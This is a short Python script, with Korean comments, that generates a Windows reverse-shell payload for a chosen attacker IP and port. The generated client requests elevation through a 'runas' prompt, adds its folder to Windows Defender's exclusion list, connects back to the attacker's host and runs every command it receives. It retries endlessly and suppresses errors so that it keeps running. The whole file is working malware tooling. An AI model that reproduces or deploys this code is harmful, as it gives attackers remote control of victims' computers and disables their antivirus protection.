import os
import argparse

DEBUG = False
UAC_BYPASS = True
### argparser
parser = argparse.ArgumentParser()

parser.add_argument("--ip","-i",dest='ip',help="ex) 127.0.0.1",default="127.0.0.1")
parser.add_argument("--port","-p",dest='port',help="ex) 8080",default="9001")
args = parser.parse_args()


print(f"target host's ip : {args.ip}")
print(f"target host's port : {args.port}")

python_code = f'''
import os,socket,subprocess
import time,sys
import win32com.shell.shell as shell

DEBUG={DEBUG}
UAC_BYPASS={UAC_BYPASS}

def debug_print(str):
    if(DEBUG):
        print(str)
def debug_pause():
    if(DEBUG):
        os.system('pause')

### UAC to get Admins
debug_print("hello debug!")
if(UAC_BYPASS):
    if sys.argv[-1] != 'asadmin':
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script]+sys.argv[1:]+['asadmin'])
        shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
        sys.exit(0)

    script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
    subprocess.call(script,shell=True) #다른프로세스로 실행되기때문에, vscode 또는 cmd 출력을 사용할 수 없습니다.
#os.system("pause")

#### payload


#port = 9001 #port of attack_server
port = {args.port}
#host_addr = "175.192.214.36" #address of attack_server
#host_addr = "localhost" 
host_addr = "{args.ip}"
debug_print("client start...")

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host_addr, port))
            debug_print(f"connected to {{host_addr}} {{port}}")
            while True:
                debug_print("wait for server message...")
                data = s.recv(10000).decode()
                debug_print(f"server sended : {{data}}")
                if(data[:2]=="cd"):
                    try:
                        os.chdir(str(data[3:]))
                        output=os.getcwd()
                    except Exception as e:
                        output=str(e)
                else:
                    output=subprocess.getoutput(data)
                debug_print(f"output: /{{output}}/")
                if(output==''): #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
                    s.send("null...".encode())
                s.send(output.encode())
                debug_print("sended!")
                

    except(ConnectionRefusedError,ConnectionResetError):
        debug_print('Connection lost... Retrying in 5 seconds')
        time.sleep(1)
    except Exception as e:
        debug_print(e)
        pass #네트워크 에러면 재시도하고, 다른 모든 에러는 모두 pass해서 절대 꺼지지않도록 함.
        

'''

host_ipaddr_dotReplaced = (args.ip).replace(".","-")
filedir = os.path.dirname(os.path.abspath(__file__))
print(filedir)
with open(f'gen_payload_{host_ipaddr_dotReplaced}_{args.port}.py', 'w',encoding="utf-8") as f:
    # 코드 작성
    f.write(f"{python_code}")

print("payload generated...")

os.system("pause")